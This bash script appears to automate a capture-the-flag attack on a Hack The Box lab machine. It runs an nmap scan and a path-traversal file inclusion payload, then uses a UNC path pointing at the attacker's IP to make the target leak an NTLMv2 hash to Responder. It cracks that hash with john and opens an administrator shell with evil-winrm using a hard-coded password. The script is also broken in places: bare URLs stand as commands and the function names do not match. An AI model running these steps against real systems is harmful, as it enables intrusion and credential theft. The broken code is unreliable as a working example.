#!/bin/bash

getdep(){
	which evil-winrm 1>2
	if [ $(echo $?) != 0 ]
		then
		sudo apt-get install evil-winrm -y
		which john 1>2
		if [ $(echo $?) != 0 ]
			then
			sudo apt-get install john -y
		fi
	fi
}


init_scan(){
	sudo nmap -sV -sC --min-rate=5000 -Pn 10.129.136.91 > scan &
	echo "10.129.136.91 unika.htb" | sudo tee -a /etc/hosts
}


LocalFileInclusion(){
	http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts
	wget blob:https://app.hackthebox.com/43f57402-9df2-4a46-a255-79b51bcb7f43 -o Responder
}

sniff_credentials(){
	sudo responder -I tun0 -wF
	http://unika.htb/index.php?page=//10.10.16.98/pwnedfile
	cat ntlm_auth_in_hash | tail -1 | awk '{print }' > ntlm_hash
}

crakhash(){
	john -w=/usr/share/wordlists/rockyou.txt ntlm_hash
	john --show ntlm_hash > hash_pwned
}

pwned(){
	evil-winrm -i 10.129.136.91 -u administrator -p badminton
}

main(){
	# First download the documentation maschine
	getdep;
	# Running the port scanning 
	init_scan;
	# excecute new LFI
	LocalFileInclusion;
	# Intruder and sniffing the credentials
	# NTLMv2
	sniff_credentials;
	# Execute new cracking the hash NTLMv2
	crackhash;
	# This machine has pwned with evil-winrm
	pwned;

}

main;
